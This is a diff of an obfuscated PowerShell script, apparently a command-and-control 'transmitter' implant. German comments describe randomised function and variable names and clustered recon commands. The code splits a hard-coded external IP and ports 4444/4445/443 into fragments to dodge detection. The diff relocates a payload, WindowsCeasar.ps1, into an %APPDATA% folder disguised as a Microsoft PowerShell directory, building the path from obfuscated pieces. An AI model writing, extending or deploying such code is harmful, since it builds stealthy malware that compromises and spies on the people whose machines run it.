@@ -339,15 +339,15 @@ $transmitterScriptContent = @'
 # Funktionsnamen geändert zu randomisierten (z.B. FnGk1, FnTd2, FnRe3).
 # Variablennamen randomisiert (z.B. vDh für DOWNLOAD_HOST, vCk für CurrentKey etc.).
 # Änderungen: Initialer Enum entfernt; Recon in dedizierte Befehle geklustert; Help aktualisiert; Prompt dynamisch nach jedem Befehl.
-# Fix: Pfad zu WindowsCeasar.ps1 korrigiert auf %USERPROFILE%\operations\System\WindowsCeasar.ps1
+# Fix: Pfad zu WindowsCeasar.ps1 korrigiert auf %APPDATA%\Microsoft\Windows\PowerShell\operation\System\WindowsCeasar.ps1
 $a = '145'; $b = '223'; $c = '117'; $d = '77'; $obfIp = $a + '.' + $b + '.' + $c + '.' + $d
 $pDl = [int]('4'+'4'+'4'+'4')
 $pUl = [int]('4'+'4'+'4'+'5')
 $pMn = [int]('4'+'4'+'3')
 $hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
 $vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
-$esP1 = '\ope'; $esP2 = 'rations\Sy'; $esP3 = 'stem\Wind'; $esP4 = 'owsCeasar.ps1'
-$vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
+$esP1 = '\Micro'; $esP2 = 'soft\Win'; $esP3 = 'dows\Power'; $esP4 = 'Shell\ope'; $esP5 = 'ration\S'; $esP6 = 'ystem\Wi'; $esP7 = 'ndowsCea'; $esP8 = 'sar.ps1'
+$vEs = $env:APPDATA + $esP1 + $esP2 + $esP3 + $esP4 + $esP5 + $esP6 + $esP7 + $esP8
 $vCk = 't' + 'e' + 's' + 't'
 function FnGk1 {
     param ([string]$p1, [byte[]]$s1)
